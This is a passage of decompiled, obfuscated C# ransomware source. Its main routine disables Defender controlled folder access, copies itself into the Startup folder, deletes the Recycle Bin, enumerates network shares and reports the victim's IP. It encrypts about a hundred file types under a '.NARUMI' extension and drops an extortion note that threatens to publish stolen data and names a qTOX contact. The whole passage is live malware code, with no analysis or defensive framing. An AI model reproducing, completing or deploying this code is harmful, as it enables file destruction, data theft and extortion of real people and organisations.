					catch (Exception)
					{
					}
					break;
				}
			}
			vJUzSMoRbycwzG.Remove(c00000b.ldrdWbhdALtRA);
		}

		static mDsrdwsfBAgqx()
		{
			Strings.CreateGetStringDelegate(typeof(mDsrdwsfBAgqx));
		}
	}

	private sealed class cTttKVwFNmpq
	{
		public string f000044;

		public string eedfnXcwSQkQNFbIx;

		public void m00001d()
		{
			while (true)
			{
				try
				{
					File.Delete(f000044);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void m00001e()
		{
			while (true)
			{
				try
				{
					if (File.Exists(eedfnXcwSQkQNFbIx))
					{
						File.Delete(eedfnXcwSQkQNFbIx);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string gheRqfduEuJ;

	public static byte[] bGfpmpYMCsNkyjcK;

	public static string HirTGWkSHczrmbY;

	public static string nsiwXjKpMUO;

	public static List<string> ZmKssmQIdPi;

	public static List<string> f000001;

	public static string zMQimCitOD;

	public static string f000002;

	public static string f000003;

	public static string EXVykcHaTCNay;

	public static string szjPprKwdybiP;

	public static int IwCCvRldil;

	public static string BBqvZtJMKtZyzF;

	public static string MkWPFkyuHrLz;

	public static string tGBTkHzktdbqpsN;

	public static string IHkGIfOFsBs;

	public static string PktefsOLxgM;

	public static string lvMwbEyyvL;

	public static string f000004;

	public static string f000005;

	public static List<string> FBdBqWxFZQgyhcDd;

	public static List<string> HMEbcaxMfcYzgl;

	public static string wbKIZmscSBasobt;

	public static string dVUrkAuvmqKS;

	public static string uSiPWDmilru;

	public static List<string> f000006;

	public static string f000007;

	private static string f000008;

	public static string rmNaxrdaErS;

	public static string nnUkiNRMVi;

	public static List<string> f000009;

	public static List<string> VfIRuRDoHW;

	public static List<string> ZSMEaXFyFht;

	public static List<string> f00000a;

	public static string edpjkmWiBB;

	public static List<string> pmzwKqsyDlmmF;

	public static List<string> f00000b;

	public static string aYqzBWQifeA;

	public static string f00000c;

	internal static DateTime f00000d;

	internal static DateTime f00000e;

	public static string f00000f;

	public static string f000010;

	public static string f000011;

	public static string fNMfifGmoXya;

	public static string rPQFiVwCriY;

	public static string yrIyoHrzWDCT;

	public static string NwrSvcEHBCxFfoz;

	public static string f000012;

	public static List<string> f000013;

	public static string f000014;

	public static string f000015;

	public static string MSbkqSPZNmrgShe;

	public static string f000016;

	public static string f000017;

	public static string fKcZCslCfAJPz;

	public static string KWarveAlrUeLj;

	public static string CvhuRhPbSX;

	public static string f000018;

	public static string f000019;

	public static string EiyrcFiAoaX;

	public static string f00001a;

	public static string SbkfEriDLMxWh;

	public static string f00001b;

	public static string NMKbJRePeNuLz;

	public static string OIjqWZRpNdE;

	public static string f00001c;

	public static string f00001d;

	public static string XoculucrhuBC;

	public static string RoiBxbbYOpTnzdF;

	public static string f00001e;

	public static string f00001f;

	public static string cuUuUUMpmxH;

	public static string f000020;

	public static string nmjDhIwEGnMOrO;

	public static string aYrdlpstiAwAZTu;

	public static string nqNdPWHffReq;

	public static string f000021;

	public static string f000022;

	public static string[] YacSoacXjaCUC;

	public static string QtTrkEhpkGUJgMO;

	public static bool uBIPmjbCjNt;

	public static string f000023;

	public static bool PAOJgADrbjEa;

	public static bool hxCcwpobkJC;

	public static bool FRIhZgoxuuhF;

	public static bool f000024;

	public static string f000025;

	public static bool CCDyMIHlAe;

	public static bool f000026;

	public static bool f000027;

	public static bool f000028;

	public static bool UOlZmEwYRBbnfmvt;

	public static string muQSQoYNOwJp;

	public static bool f000029;

	public static Stopwatch lBGXxmsJjqv;

	public static int f00002a;

	public static int f00002b;

	public static bool YazilaoopZ;

	public static string f00002c;

	public static string[] caYhozbaifo;

	public static List<string> KlnqoelvmWHjj;

	public static int f00002d;

	public static bool RaNDyCdUClri;

	public static bool f00002e;

	public static bool CoyMCdqKPDBfCk;

	public static bool f00002f;

	public static bool f000030;

	private static ThreadStart f000031;

	private static Action<string> f000032;

	private static Action<string> f000033;

	private static Action<string> f000034;

	private static Action<string> f000035;

	private static Action<string> f000036;

	[NonSerialized]
	internal static GetString f000037;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint p0, uint p1);

	private static void Main(string[] args)
	{
		try
		{
			c000004 c20 = new c000004();
			c20.avfxhzATpymbWL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count(c20.m000012) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			GpSuvmMCrcEnBNN.m000027(f000008);
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYrdlpstiAwAZTu == "YES")
			{
				Thread thread = new Thread(ReEGuVGZtzhJ.QwimkMrTSXf);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch (Exception)
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (tGBTkHzktdbqpsN == "YES")
		{
			Thread.Sleep(int.Parse(IHkGIfOFsBs));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NwrSvcEHBCxFfoz == "YES")
		{
			try
			{
				ubalMIbEpbeY("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch (Exception)
			{
			}
		}
		try
		{
			_ = f000004 == "YES";
		}
		catch (Exception)
		{
		}
		_ = dVUrkAuvmqKS == "YES";
		if (MkWPFkyuHrLz == "YES")
		{
			c00000f.leUcrsvMUGz();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (szjPprKwdybiP == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(OvqakdodhLDH);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (zMQimCitOD == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					IwCCvRldil = EwHBDgtvrOMYeg(0, FBdBqWxFZQgyhcDd.Count);
					File.Copy(fileName, text + FBdBqWxFZQgyhcDd[IwCCvRldil], overwrite: true);
					Process.Start(text + FBdBqWxFZQgyhcDd[IwCCvRldil]);
					OQGiATnqshpg();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYqzBWQifeA == "YES" && DateTime.Now < f00000d)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (f00000c == "YES" && DateTime.Now > f00000e)
			{
				OQGiATnqshpg();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			AllocConsole();
			Console.Title = "This console window will close by itself. DON'T CLOSE IT MANUALLY OR THE WHOLE PROCESS WILL TERMINATE!";
			if (SbkfEriDLMxWh == "YES")
			{
				Console.WriteLine("Network scanning in process...");
			}
			lBGXxmsJjqv.Start();
		}
		catch (Exception)
		{
		}
		m000005();
		if (f000031 == null)
		{
			f000031 = m00000c;
		}
		Thread thread3 = new Thread(f000031);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				foreach (string text3 in array)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array2 = text4.Split(new char[1] { ',' });
							for (int j = 0; j < array2.Length; j++)
							{
								string text5 = array2[j].Trim();
								if (Directory.Exists(text5) && !ZmKssmQIdPi.Contains(text5) && text5 != "X:\\CustomPath1" && text5 != "Z:\\CustomPath2" && text5 != "\\\\Domain\\Path\\Folder")
								{
									ZmKssmQIdPi.Add(text5);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text6 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text6) && text6.ToLower() == "true")
						{
							SbkfEriDLMxWh = "YES";
						}
						else if (!string.IsNullOrEmpty(text6) && text6.ToLower() == "false")
						{
							SbkfEriDLMxWh = "NO";
						}
					}
					if (text3.Contains("ConsoleMode="))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "true")
						{
							f000029 = true;
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "false")
						{
							f000029 = true;
						}
					}
					if (text3.Contains("DebugLog="))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "true")
						{
							CCDyMIHlAe = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "false")
						{
							CCDyMIHlAe = false;
						}
					}
					if (text3.Contains("ImpersonateExplorer="))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "true")
						{
							RaNDyCdUClri = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "false")
						{
							RaNDyCdUClri = true;
						}
					}
				}
			}
		}
		catch (Exception ex11)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(f000025, "Configuration text file error: " + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (SbkfEriDLMxWh == "NO")
		{
			m000001();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FRIhZgoxuuhF)
			{
				try
				{
					Thread thread4 = new Thread(c00001e.OGRDaEslLrcJ);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			m000002("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\\\$Recycle.bin");
		}
		SecureString secureString = new SecureString();
		if (f000011 == "NO")
		{
			f000002 = "9o6ri4K/IhCIghFRYRh4UjhCezYpN6h8tU3bha9DWAE=";
			f000003 = "urvrsSkMbCY=";
			Console.WriteLine(f000002);
		}
		else
		{
			f000002 = "E79Z8TDOJOODRXYHW0LS9WTHWV2J44AT";
		}
		EXVykcHaTCNay = c000015.nPhDaoiHjN(f000002 + f000003);
		try
		{
			if (!PAOJgADrbjEa)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\KEYID\\myKeyID");
				if (registryKey != null)
				{
					registryKey.SetValue("ID" + (registryKey.ValueCount + 1), EXVykcHaTCNay);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\KEYID\\myKeyID");
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue("ID" + (registryKey2.ValueCount + 1), EXVykcHaTCNay);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
		}
		catch (Exception)
		{
			f000030 = true;
		}
		if (f000027)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), string.Concat("Client IP: ", new WebClient().DownloadString("http://icanhazip.com"), "\r\n", "Date of encryption: ", DateTime.Now, "\r\n", "Client Unique Identifier Key: ", EXVykcHaTCNay));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), "\r\nAdditional KeyID: " + EXVykcHaTCNay);
				}
			}
			catch (Exception ex16)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(f000025, "Error while creating Local Report: " + ex16.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!f00002f)
		{
			c000019.m00002b(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RoiBxbbYOpTnzdF), iqbhckCLJPzmcb(EXVykcHaTCNay), null, null, "Installer...", "Ctrl+Shift+X", null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			XoFivSFAPFl();
		}
		try
		{
			try
			{
				if (f000029)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch (Exception)
			{
			}
			LeefKZPaDd(new string[1] { "[auto]" }, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], f000002, ".NARUMI");
		}
		catch (Exception ex19)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(f000025, "Finish process: " + ex19.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch (Exception)
		{
		}
		if (!f00002f || f000030)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					xLkmmTTSHp();
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					streamWriter.WriteLine("------------------\r\n| What happened? |\r\n------------------\r\n\r\nYour network was ATTACKED, your computers and servers were LOCKED,\r\nYour private data was DOWNLOADED:\r\n - Contracts\r\n - Customers data\r\n - Finance\r\n - HR\r\n - Databases\r\n - And more other...\r\n\r\n----------------------\r\n| What does it mean? |\r\n----------------------\r\n\r\nIt means that soon mass media, your partners and clients WILL KNOW about your PROBLEM.\r\n\r\n--------------------------\r\n| How it can be avoided? |\r\n--------------------------\r\n\r\nIn order to avoid this issue,\r\nyou are to COME IN TOUCH WITH US no later than within 3 DAYS and conclude the data recovery and breach fixing AGREEMENT.\r\n\r\n-------------------------------------------\r\n| What if I do not contact you in 3 days? |\r\n-------------------------------------------\r\n\r\nIf you do not contact us in the next 3 DAYS we will begin DATA publication.\r\nWe will post information about hacking of your company on our twitter https://twitter.com/RobinHoodLeaks or https://parler.com/user/RobinHoodLeaks\r\n\r\n-----------------------------\r\n| I can handle it by myself |\r\n-----------------------------\r\n\r\nIt is your RIGHT, but in this case all your data will be published for public USAGE.\r\n\r\n-------------------------------\r\n| I do not fear your threats! |\r\n-------------------------------\r\n\r\nThat is not the threat, but the algorithm of our actions.\r\nIf you have hundreds of millions of UNWANTED dollars, there is nothing to FEAR for you.\r\nThat is the EXACT AMOUNT of money you will spend for recovery and payouts because of PUBLICATION.\r\nYou are exposing yourself to huge penalties with lawsuits and government if we both don't find an agreement. \r\nWe have seen it before cases with multi million costs in fines and lawsuits,\r\nnot to mention the company reputation and losing clients trust and the medias calling non-stop for answers. \r\n\r\n--------------------------\r\n| You have convinced me! |\r\n--------------------------\r\n\r\nThen you need to CONTACT US, there is few ways to DO that.\r\n\r\n\t\t   ---Secure method---\r\n\r\n   a) Download a qTOX client: https://tox.chat/download.html\r\n   b) Install the qTOX client and register account\r\n   c) Add our qTOX ID: 671263E7BC06103C77146A5ABB802A63F53A42B4C4766329A5F04D2660C99A3611635CC36B3A\r\n   d) Write us extension of your encrypted files .NARUMI\r\n\r\nOur LIVE SUPPORT is ready to ASSIST YOU on this chat.\r\n\r\n----------------------------------------\r\n| What will I get in case of agreement |\r\n----------------------------------------\r\n\r\nYou WILL GET full DECRYPTION of your machines in the network, DELETION your data from our servers, \r\nRECOMMENDATIONS for securing your network perimeter.\r\n\r\nAnd the FULL CONFIDENTIALITY ABOUT INCIDENT.\r\n\r\n----------------------------------------------------------------------------------".Replace("%ID%", "").Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter.WriteLine("\r\n");
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter.WriteLine("KEYID: ");
						streamWriter.WriteLine(EXVykcHaTCNay);
					}
					if (rmNaxrdaErS == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine("Number of files that were processed is: " + Convert.ToString(f000006.Count));
					}
					if (YazilaoopZ)
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine("PC Hardware ID: ");
						streamWriter.WriteLine("");
					}
				}
				else if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt").Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + EXVykcHaTCNay);
				}
			}
			catch (Exception ex23)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(f000025, "Error while writing main note..." + ex23.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in HMEbcaxMfcYzgl)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch (Exception)
				{
				}
				try
				{
					if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
					}
					else if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt").Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + EXVykcHaTCNay);
					}
				}
				catch (Exception ex26)
				{
					if (CCDyMIHlAe)
					{
						try
						{
							File.AppendAllText(f000025, "Error while writing main note..." + ex26.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
				}
				if (!f000024 && num > 10)
				{
					break;
				}
			}
		}
		if ((cuUuUUMpmxH == "YES" && !f00002f) || (cuUuUUMpmxH == "YES" && f000030))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(m000003("MESSAGERICH").Replace("%ID%", "").Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter2.WriteLine("\r\n");
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter2.WriteLine("<p style=\"text-align: center;\">KEYID: ");
						streamWriter2.WriteLine(EXVykcHaTCNay + "</p>");
					}
					if (rmNaxrdaErS == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine("<p style=\"text-align: center;\">Number of files that were processed is: " + Convert.ToString(f000006.Count) + "</p>");
					}
					if (YazilaoopZ)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine("PC Hardware ID: ");
						streamWriter2.WriteLine("");
					}
				}
				else if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt").Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", "<p style=\"text-align: center;\">\r\nAdditional KeyId:\r\n" + EXVykcHaTCNay + "</p>");
				}
			}
			catch (Exception ex28)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(f000025, "Error while writing rich text main note..." + ex28.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (f000007 == "YES")
		{
			try
			{
				if (rmNaxrdaErS == "NO")
				{
					c000013.gmIyowWwkfSR("URL", "USERNAME", "ACCESO", string.Concat("Client IP: ", new WebClient().DownloadString("http://icanhazip.com"), "\r", "Date of encryption: ", DateTime.Now, "\r\n", "Possible affected files: ", Convert.ToString(f000006.Count), "\r\n", "Client Unique Identifier Key: ", EXVykcHaTCNay));
				}
				else
				{
					c000013.gmIyowWwkfSR("URL", "USERNAME", "ACCESO", string.Concat("Client IP: ", new WebClient().DownloadString("http://icanhazip.com"), "\r", "Date of encryption: ", DateTime.Now, "\r\n", "Possible affected files: ", Convert.ToString(f000006.Count), "\r\n", "Client Unique Identifier Key: ", EXVykcHaTCNay));
				}
			}
			catch (Exception)
			{
			}
		}
		if (f000005 == "YES")
		{
			try
			{
				uhnJdcZsoCQU.LlIJhyFJOrlN(new Uri(""));
			}
			catch (Exception)
			{
			}
		}
		if (cuUuUUMpmxH == "NO" && !f00002f)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch (Exception)
			{
			}
		}
		else if (cuUuUUMpmxH == "YES" && !f00002f)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start("mshta.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch (Exception)
			{
			}
		}
		if (CvhuRhPbSX == "YES")
		{
			if (f000018 == "YES" && !string.IsNullOrEmpty(f000019) && !string.IsNullOrEmpty(EiyrcFiAoaX))
			{
				m000004(f000019, EiyrcFiAoaX);
			}
			else
			{
				m000004();
			}
		}
		if (f00001c != "LOGONISOFF")
		{
			pkNBJGqTbajgL(f00001c);
		}
		if (!string.IsNullOrEmpty(fKcZCslCfAJPz))
		{
			try
			{
				File.Delete(fKcZCslCfAJPz);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex35)
		{
			try
			{
				File.AppendAllText(f000025, "Error deleting config text file: " + ex35.Message);
			}
			catch (Exception)
			{
			}
		}
		if (CCDyMIHlAe)
		{
			try
			{
				File.AppendAllText(f000025, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (gheRqfduEuJ == "EVET")
		{
			OQGiATnqshpg();
		}
	}

	public static void OvqakdodhLDH()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("This program requires Microsoft .NET Framework v. 4.82 or superior to run properly", "Information...", (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int EwHBDgtvrOMYeg(int p0, int p1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(p0, p1);
	}

	public static List<string> DrqYGjBvTosyB(string p0, string[] p1, string p2, string[] p3, string p4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(p0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((text.Contains("C:\\Program Files\\") || text.Contains("C:\\Program Files (x86)\\") || text.Contains(":\\Windows\\") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.Contains(":\\ProgramData\\") || text.Contains("\\AppData\\") || text.ToLower().Contains("msocache") || text.ToLower().Contains("system volume information") || text.ToLower().Contains("boot") || text.ToLower().Contains("tor browser") || text.ToLower().Contains("mozilla") || text.ToLower().Contains("appdata") || text.ToLower().Contains("google chrome") || text.ToLower().Contains("application data")) && !text.Contains("Microsoft SQL Server"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_015d;
			}
			catch
			{
			}
			continue;
			IL_015d:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains("Builder_Log") && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".NARUMI") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(RoiBxbbYOpTnzdF) && !fileInfo.FullName.Contains(f000025) && !fileInfo.FullName.Contains(muQSQoYNOwJp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == "YES")
						{
							list.Add(fileInfo.FullName);
							m00000a(list, p1, p2, p3, p4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && HirTGWkSHczrmbY == "NO")
						{
							list.Add(fileInfo.FullName);
							m00000a(list, p1, p2, p3, p4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void m000001()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!ZmKssmQIdPi.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ZmKssmQIdPi.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string m000002(string p0 = "", string NmrYzUWTFAwHib = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = p0,
				Arguments = NmrYzUWTFAwHib,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void ubalMIbEpbeY(string p0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = p0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string TfBMtOaYnyXfeqqRN(string p0)
	{
		char[] array = p0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string m000003(string p0)
	{
		byte[] bytes = Convert.FromBase64String(p0);
		return Encoding.UTF8.GetString(bytes);
	}

